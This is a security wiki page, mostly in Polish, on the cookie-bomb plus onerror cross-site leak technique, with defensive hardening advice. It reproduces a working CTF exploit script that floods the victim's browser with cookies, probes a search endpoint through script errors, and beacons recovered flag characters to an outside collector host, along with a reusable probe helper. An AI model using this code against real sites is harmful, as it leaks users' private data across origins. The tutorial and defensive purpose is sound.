# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Ta technika łączy:
- Cookie bombing: zapełnienie przeglądarki ofiary wieloma/dużymi cookies dla docelowego origin, tak aby kolejne żądania osiągały limity serwera/żądania (request header size, URL size in redirects, etc.).
- Error-event oracle: sondowanie cross-origin endpointu przy użyciu <script> (lub innego subresource) i rozróżnianie stanów przez onload vs onerror.

High level idea
- Znajdź docelowy endpoint, którego zachowanie różni się dla dwóch stanów, które chcesz przetestować (np. wyszukiwanie “hit” vs “miss”).
- Upewnij się, że ścieżka “hit” spowoduje długi łańcuch przekierowań lub długi URL, podczas gdy ścieżka “miss” pozostanie krótka. Napompuj nagłówki żądania za pomocą wielu cookies tak, aby tylko ścieżka “hit” spowodowała awarię serwera ze statusem HTTP (np. 431/414/400). Ten błąd powoduje wywołanie onerror i staje się oraklem dla XS-Search.

When does this work
- Możesz spowodować, że przeglądarka ofiary wyśle cookies do celu (np. cookies są SameSite=None lub możesz ustawić je w kontekście first-party przez popup window.open).
- Aplikacja ma funkcję, którą można wykorzystać do ustawiania dowolnych cookies (np. endpointy “save preference”, które zamieniają kontrolowane nazwy/wartości pól wejściowych na Set-Cookie) lub do wykonania post-auth redirectów, które wstawiają dane kontrolowane przez atakującego do URL.
- Serwer reaguje inaczej w tych dwóch stanach i przy napompowanych nagłówkach/URL jedna ścieżka przekracza limit i zwraca odpowiedź błędu, która uruchamia onerror.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large is commonly returned when cookies inflate request headers; 414 URI Too Long or a server-specific 400 may be returned for long request targets. Any of these result in a failed subresource load and fire onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
Poniższy skrypt (z publicznego writeupu) wykorzystuje funkcję, która pozwala atakującemu wstawić dowolne cookies, a następnie ładuje cross-origin search endpoint jako skrypt. Gdy zapytanie jest poprawne, serwer wykonuje redirect, który wraz z rozmiarem cookies przekracza limity serwera i zwraca status błędu, więc script.onerror się uruchamia; w przeciwnym razie nic się nie dzieje.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Dlaczego popup (window.open)?
- Nowoczesne przeglądarki coraz częściej blokują third-party cookies. Otwarcie top-level window do target powoduje, że cookies są first-party, więc odpowiedzi Set-Cookie od target zostaną zachowane, co umożliwia krok cookie-bomb nawet przy ograniczeniach third-party cookies.

Ogólny pomocnik sondowania
Jeśli masz już sposób na ustawienie wielu cookies na target origin (first-party), możesz ponownie użyć tego minimalnego oracle wobec dowolnego endpointu, którego powodzenie/niepowodzenie prowadzi do różnych rezultatów sieciowych (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Wskazówki jak zbudować oracle
- Wymuś, aby stan „pozytywny” był cięższy: dołącz dodatkowe przekierowanie tylko wtedy, gdy warunek jest prawdziwy, lub spraw, by URL przekierowania odzwierciedlał nieograniczone dane wprowadzone przez użytkownika, tak aby rósł wraz ze zgadywanym prefiksem.
- Zwiększ rozmiar nagłówków: powtarzaj cookie bombing, aż na „ciężkiej” ścieżce zaobserwujesz spójny błąd. Serwery często ograniczają rozmiar nagłówków i zawiodą wcześniej, gdy obecnych jest wiele cookies.
- Stabilizuj: uruchom wiele równoległych operacji ustawiania cookies i sonduj wielokrotnie, aby uśrednić szumy związane z opóźnieniami i pamięcią podręczną.

Powiązane XS-Search tricks
- URL length based oracles (no cookies needed) można łączyć lub stosować zamiast nich, gdy możesz wymusić bardzo długi cel żądania:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Obrona i utwardzanie
- Spraw, aby odpowiedzi w przypadku sukcesu i porażki były nierozróżnialne:
- Unikaj warunkowych przekierowań lub dużych różnic w rozmiarze odpowiedzi między stanami. Zwracaj ten sam status, ten sam Content-Type i podobną długość treści niezależnie od stanu.
- Zablokuj sondowanie subresource cross-site:
- SameSite cookies: ustaw wrażliwe cookies na SameSite=Lax lub Strict, tak aby żądania subresource takie jak <script src> ich nie niosły; preferuj Strict dla auth tokens, gdy to możliwe.
- Fetch Metadata: egzekwuj Resource Isolation Policy, aby odrzucać ładowanie cross-site subresources (np. jeśli Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): ustaw CORP: same-origin (lub przynajmniej same-site) dla endpointów, które nie mają być osadzane jako cross-origin subresources.
- X-Content-Type-Options: nosniff oraz poprawny Content-Type na endpointach JSON/HTML, aby uniknąć ładowania jako skrypt i związanych z tym niespójności.
- Ogranicz amplifikację nagłówków/URL:
- Ogranicz liczbę/rozmiar ustawianych cookies; sanityzuj funkcje, które zamieniają dowolne pola formularzy na Set-Cookie.
- Normalizuj lub obcinaj reflektowane dane w przekierowaniach; unikaj osadzania długich łańcuchów kontrolowanych przez atakującego w URL-ach Location.
- Utrzymuj limity serwera spójne i zwracaj błędy jednakowo (unikaj specjalnych stron błędów tylko dla jednej gałęzi).

Uwagi
- Ta klasa ataków jest szeroko omawiana jako „Error Events” XS-Leaks. Krok cookie-bomb jest po prostu wygodnym sposobem, by przepchnąć tylko jedną gałąź poza limity serwera, tworząc wiarygodny boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
